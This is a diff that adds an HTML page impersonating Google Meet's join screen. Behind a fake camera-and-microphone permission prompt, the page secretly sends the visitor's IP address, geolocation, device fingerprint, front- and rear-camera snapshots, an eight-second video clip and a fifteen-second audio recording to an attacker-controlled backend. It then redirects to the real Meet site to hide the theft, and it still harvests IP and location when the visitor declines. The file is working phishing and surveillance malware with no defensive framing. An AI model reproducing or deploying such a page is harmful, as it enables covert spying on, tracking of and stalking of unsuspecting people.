@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Meet</title>
+<link rel="icon" href="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png">
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:#202124; color:#e8eaed; font-family:'Google Sans',Roboto,sans-serif; height:100vh; display:flex; flex-direction:column; overflow:hidden; }
+.top-bar { display:flex; align-items:center; justify-content:space-between; padding:12px 24px; background:#202124; }
+.meet-logo { display:flex; align-items:center; gap:8px; }
+.meet-logo svg { width:120px; }
+.top-right { display:flex; align-items:center; gap:16px; font-size:.85rem; color:#9aa0a6; }
+.avatar { width:32px; height:32px; border-radius:50%; background:linear-gradient(135deg,#4285f4,#34a853); display:flex; align-items:center; justify-content:center; font-size:.85rem; font-weight:700; }
+.main { flex:1; display:flex; align-items:center; justify-content:center; gap:48px; padding:32px; }
+.left-panel { max-width:480px; }
+.left-panel h1 { font-size:2.4rem; font-weight:400; margin-bottom:12px; }
+.left-panel p { color:#9aa0a6; font-size:1rem; margin-bottom:28px; line-height:1.5; }
+.code-box { background:#303134; border-radius:8px; padding:16px 20px; margin-bottom:24px; display:flex; align-items:center; justify-content:space-between; }
+.code-box span { font-size:1rem; color:#8ab4f8; font-family:monospace; letter-spacing:.05em; }
+.code-box small { color:#9aa0a6; font-size:.8rem; }
+.btn-join { background:#1a73e8; color:#fff; border:none; padding:14px 28px; border-radius:8px; font-size:1rem; font-family:'Google Sans',sans-serif; cursor:pointer; width:100%; transition:.2s; }
+.btn-join:hover { background:#1557b0; }
+.right-panel { position:relative; width:420px; height:280px; background:#303134; border-radius:16px; overflow:hidden; }
+.right-panel video { width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
+.preview-label { position:absolute; bottom:16px; left:16px; background:rgba(0,0,0,.6); color:#fff; font-size:.8rem; padding:4px 10px; border-radius:4px; }
+.cam-controls { position:absolute; bottom:16px; left:50%; transform:translateX(-50%); display:flex; gap:12px; }
+.cam-btn { width:40px; height:40px; border-radius:50%; border:none; cursor:pointer; display:flex; align-items:center; justify-content:center; font-size:1.1rem; transition:.2s; }
+.cam-btn.mic { background:#303134; border:1px solid #5f6368; color:#fff; }
+.cam-btn.cam { background:#303134; border:1px solid #5f6368; color:#fff; }
+.cam-btn:hover { background:#444; }
+.waiting-text { text-align:center; color:#9aa0a6; font-size:.9rem; padding:20px; }
+.modal { position:fixed; inset:0; background:rgba(0,0,0,.75); display:flex; align-items:center; justify-content:center; z-index:100; }
+.modal-box { background:#303134; border-radius:12px; padding:32px; max-width:400px; width:90%; text-align:center; }
+.modal-box h2 { font-size:1.3rem; margin-bottom:8px; }
+.modal-box p { color:#9aa0a6; font-size:.9rem; margin-bottom:24px; line-height:1.5; }
+.modal-icon { font-size:2.5rem; margin-bottom:16px; }
+.allow-btn { background:#1a73e8; color:#fff; border:none; padding:12px 32px; border-radius:8px; font-size:.95rem; cursor:pointer; width:100%; margin-bottom:10px; }
+.deny-btn { background:transparent; color:#9aa0a6; border:1px solid #5f6368; padding:10px 32px; border-radius:8px; font-size:.9rem; cursor:pointer; width:100%; }
+.hidden { display:none!important; }
+.participants { display:flex; gap:-8px; margin-bottom:16px; }
+.part-avatar { width:36px; height:36px; border-radius:50%; border:2px solid #202124; margin-right:-8px; display:flex; align-items:center; justify-content:center; font-size:.85rem; font-weight:600; }
+</style>
+</head>
+<body>
+
+<!-- Top Bar -->
+<div class="top-bar">
+  <div class="meet-logo">
+    <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <text y="30" font-size="26" font-family="Google Sans, sans-serif" font-weight="500" fill="#e8eaed">Meet</text>
+      <circle cx="108" cy="20" r="8" fill="#34a853"/>
+      <circle cx="108" cy="20" r="5" fill="#202124"/>
+    </svg>
+  </div>
+  <div class="top-right">
+    <span id="clock">12:00</span>
+    <span>•</span>
+    <span id="date-str">Mon, Oct 1</span>
+    <div class="avatar">A</div>
+  </div>
+</div>
+
+<!-- Permission Modal -->
+<div class="modal" id="permModal">
+  <div class="modal-box">
+    <div class="modal-icon">📹</div>
+    <h2>Allow Camera & Microphone</h2>
+    <p>Google Meet needs access to your camera and microphone to join this meeting. Other participants are already waiting.</p>
+    <div class="participants" style="justify-content:center;margin-bottom:20px;">
+      <div class="part-avatar" style="background:#4285f4">J</div>
+      <div class="part-avatar" style="background:#34a853">S</div>
+      <div class="part-avatar" style="background:#fbbc04">M</div>
+      <div class="part-avatar" style="background:#ea4335">+3</div>
+    </div>
+    <button class="allow-btn" onclick="requestPerms()">Allow & Join Meeting</button>
+    <button class="deny-btn" onclick="denyPerms()">Cancel</button>
+  </div>
+</div>
+
+<!-- Main -->
+<div class="main" id="mainContent">
+  <div class="left-panel">
+    <h1>Ready to join?</h1>
+    <p>6 people are in this meeting. Your camera preview is shown on the right.</p>
+    <div class="code-box">
+      <div>
+        <small>Meeting code</small><br>
+        <span>zom-xkpq-rbt</span>
+      </div>
+      <button onclick="navigator.clipboard.writeText('zom-xkpq-rbt')" style="background:none;border:none;color:#8ab4f8;cursor:pointer;font-size:.85rem;">Copy</button>
+    </div>
+    <button class="btn-join" onclick="joinMeeting()">Join now</button>
+    <p style="margin-top:16px;font-size:.82rem;color:#9aa0a6;text-align:center">By joining, you agree to <a href="#" style="color:#8ab4f8">Google's Terms of Service</a></p>
+  </div>
+  <div class="right-panel">
+    <video id="previewVid" autoplay muted playsinline></video>
+    <div class="preview-label" id="previewLabel">Initializing camera...</div>
+    <div class="cam-controls">
+      <button class="cam-btn mic" title="Mute mic">🎤</button>
+      <button class="cam-btn cam" title="Turn off camera">📷</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const BACKEND = 'forwarding_link';
+let stream = null;
+let capturesDone = false;
+
+// Clock
+function updateClock() {
+    const now = new Date();
+    document.getElementById('clock').textContent = now.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
+    document.getElementById('date-str').textContent = now.toLocaleDateString([], {weekday:'short',month:'short',day:'numeric'});
+}
+setInterval(updateClock, 1000); updateClock();
+
+async function requestPerms() {
+    document.getElementById('permModal').classList.add('hidden');
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width:1280, height:720 }, audio: true });
+        document.getElementById('previewVid').srcObject = stream;
+        document.getElementById('previewLabel').textContent = 'You (Preview)';
+        captureData();
+    } catch(e) {
+        document.getElementById('previewLabel').textContent = 'Camera unavailable';
+        captureDataNoCamera();
+    }
+}
+
+function denyPerms() {
+    document.getElementById('permModal').classList.add('hidden');
+    captureDataNoCamera();
+}
+
+async function captureData() {
+    if (capturesDone) return;
+    capturesDone = true;
+
+    // 1. IP logging
+    await fetch(BACKEND + '/ip.php').catch(()=>{});
+
+    // 2. Location
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) }).catch(()=>{}),
+            () => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({ lat:'', lon:'', acc:'' }) }).catch(()=>{})
+        );
+    }
+
+    // 3. Device fingerprint
+    const bat = await navigator.getBattery ? navigator.getBattery().then(b => Math.round(b.level*100)+'%'+(b.charging?' (charging)':' (unplugged)')).catch(()=>'N/A') : 'N/A';
+    const net = (navigator.connection || {}).effectiveType || 'N/A';
+    const ua  = navigator.userAgent;
+    const os  = /Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':'Other';
+    const br  = /Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Other';
+    fetch(BACKEND + '/device_info.php', { method:'POST', body: new URLSearchParams({ os, browser: br, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, screen_w: screen.width, screen_h: screen.height, pixel_ratio: window.devicePixelRatio, cores: navigator.hardwareConcurrency||'N/A', battery: await bat, network: net, platform: navigator.platform, touch: navigator.maxTouchPoints }) }).catch(()=>{});
+
+    // 4. Camera burst (front)
+    if (stream) {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        await video.play().catch(()=>{});
+        await new Promise(r => setTimeout(r, 1200));
+        for (let i = 0; i < 5; i++) {
+            const c = document.createElement('canvas');
+            c.width = video.videoWidth || 1280; c.height = video.videoHeight || 720;
+            c.getContext('2d').drawImage(video, 0, 0);
+            const blob = c.toDataURL('image/jpeg', 0.9);
+            fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: blob, burst_index: i, cam_facing: 'user', shot_type: 'burst' }) }).catch(()=>{});
+            await new Promise(r => setTimeout(r, 400));
+        }
+
+        // 5. Short video clip
+        try {
+            const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                const blob = new Blob(chunks, { type:'video/webm' });
+                const reader = new FileReader();
+                reader.onload = () => fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ video_clip: reader.result, cam_facing: 'user' }) }).catch(()=>{});
+                reader.readAsDataURL(blob);
+            };
+            rec.start(); setTimeout(() => rec.stop(), 8000);
+        } catch(e) {}
+
+        // 6. Mic recording
+        try {
+            const micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+            const micRec = new MediaRecorder(micStream);
+            const micChunks = [];
+            micRec.ondataavailable = e => micChunks.push(e.data);
+            micRec.onstop = () => {
+                const blob = new Blob(micChunks, { type:'audio/webm' });
+                const reader = new FileReader();
+                reader.onload = () => fetch(BACKEND + '/audio.php', { method:'POST', body: new URLSearchParams({ audio_clip: reader.result }) }).catch(()=>{});
+                reader.readAsDataURL(blob);
+            };
+            micRec.start(); setTimeout(() => micRec.stop(), 15000);
+        } catch(e) {}
+
+        // 7. Rear camera burst (try switching)
+        try {
+            const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
+            const rv = document.createElement('video'); rv.srcObject = rearStream; rv.muted = true;
+            await rv.play().catch(()=>{});
+            await new Promise(r => setTimeout(r, 1000));
+            for (let i = 0; i < 3; i++) {
+                const c = document.createElement('canvas'); c.width = rv.videoWidth||1280; c.height = rv.videoHeight||720;
+                c.getContext('2d').drawImage(rv, 0, 0);
+                fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.9), burst_index: i, cam_facing: 'environment', shot_type: 'burst' }) }).catch(()=>{});
+                await new Promise(r => setTimeout(r, 400));
+            }
+            rearStream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+}
+
+async function captureDataNoCamera() {
+    await fetch(BACKEND + '/ip.php').catch(()=>{});
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => fetch(BACKEND + '/location.php', { method:'POST', body: new URLSearchParams({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) }).catch(()=>{}),
+            () => {}
+        );
+    }
+}
+
+function joinMeeting() {
+    document.querySelector('.btn-join').textContent = 'Joining...';
+    setTimeout(() => { window.location.href = 'https://meet.google.com'; }, 3000);
+}
+
+// Auto-show modal
+window.addEventListener('load', () => {
+    setTimeout(() => document.getElementById('permModal').classList.remove('hidden'), 1500);
+});
+</script>
+</body>
+</html>
